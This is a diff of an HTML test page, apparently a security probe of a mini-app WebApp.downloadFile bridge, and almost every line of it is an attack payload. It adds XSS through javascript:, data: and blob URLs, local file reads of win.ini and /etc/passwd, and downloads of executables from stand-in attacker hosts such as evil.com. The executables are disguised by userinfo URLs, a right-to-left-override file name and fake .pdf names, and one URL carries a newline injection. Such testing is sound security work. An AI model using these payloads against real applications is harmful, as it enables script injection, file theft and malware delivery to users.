@@ -3,18 +3,58 @@
     WebApp.downloadFile("file:///C:/Windows/win.ini","test.html");
 </script>
 <script>
-window.parent.postMessage(
-  JSON.stringify({
-    type: "WebAppOpenLink",
-    url: "javascript:alert(document.domain)"
-  }),
-  "https://mr1609.web-test.oneme.ru"
-);
+WebApp.downloadFile({
+  url: decodeURIComponent("javascript%3Aalert('XSS%20Encoded')"),
+  name: "encoded_xss.html"
+});
 </script>
 <script>
 WebApp.downloadFile({
-  url: "javascript:alert('XSS from downloadFile')",
-  name: "xss.html"
+  url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+  name: "data_xss.html"
 });
 </script>
-
+<script>
+const blob = new Blob(["<script>alert('Blob XSS')</script>"], { type: "text/html" });
+const blobUrl = URL.createObjectURL(blob);
+WebApp.downloadFile({
+  url: blobUrl,
+  name: "blob_xss.html"
+});
+</script>
+<script>
+WebApp.downloadFile({
+  url: "https://secure-bank.com@evil.com/dropper.exe",
+  name: "important_doc.pdf"
+});
+</script>
+<script>
+WebApp.downloadFile({
+  url: "https://evil.com/dropper.exe",
+  name: "invoiceвЂ®cod.exe"
+});
+</script>
+<script>
+WebApp.downloadFile({
+  url: "file:///etc/passwd",
+  name: "passwd.txt"
+});
+</script>
+<script>
+WebApp.downloadFile({
+  url: "https://attacker.site/malware.exe",
+  name: "document.pdf"
+});
+</script>
+<script>
+WebApp.downloadFile({
+  url: "https://evil.com/serve.php?f=malware",
+  name: "report.pdf"
+});
+</script>
+<script>
+WebApp.downloadFile({
+  url: "https://evil.com\npayload.exe",
+  name: "newline-test.txt"
+});
+</script>
